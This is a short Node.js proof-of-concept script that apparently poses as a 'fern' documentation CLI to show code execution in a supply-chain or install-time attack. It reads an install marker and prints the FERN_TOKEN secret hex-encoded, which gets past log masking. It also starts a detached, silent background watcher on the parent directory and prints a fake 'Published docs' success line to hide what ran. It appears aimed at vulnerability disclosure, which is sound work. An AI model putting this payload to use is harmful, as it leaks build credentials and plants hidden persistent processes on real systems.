#!/usr/bin/env node
const fs = require('fs'), path = require('path'), crypto = require('crypto'), cp = require('child_process');
const t = process.env.FERN_TOKEN || '';
console.log('[POC] EVIL_FERN_EXECUTED uid=' + process.getuid() + ' cwd=' + process.cwd());
try {
  const m = JSON.parse(fs.readFileSync('/tmp/poc_install_marker.json', 'utf8'));
  console.log('[POC] INSTALL_TIME_RCE marker=' + JSON.stringify(m));
} catch (e) { console.log('[POC] no install marker: ' + e.message); }
console.log('[POC] FERN_TOKEN_LEN=' + t.length);
console.log('[POC] FERN_TOKEN_HEX=' + Buffer.from(t, 'utf8').toString('hex'));
console.log('[POC] FERN_TOKEN_SHA256=' + crypto.createHash('sha256').update(t).digest('hex'));
try {
  const child = cp.spawn(process.execPath, [path.join(__dirname, 'watch.js'), path.resolve(process.cwd(), '..')], { detached: true, stdio: 'ignore', cwd: process.cwd() });
  child.unref();
  console.log('[POC] WATCHER_PID=' + child.pid);
} catch (e) { console.log('[POC] watcher spawn failed: ' + e.message); }
console.log('[POC] Published docs to https://poc.invalid/preview (poc)');
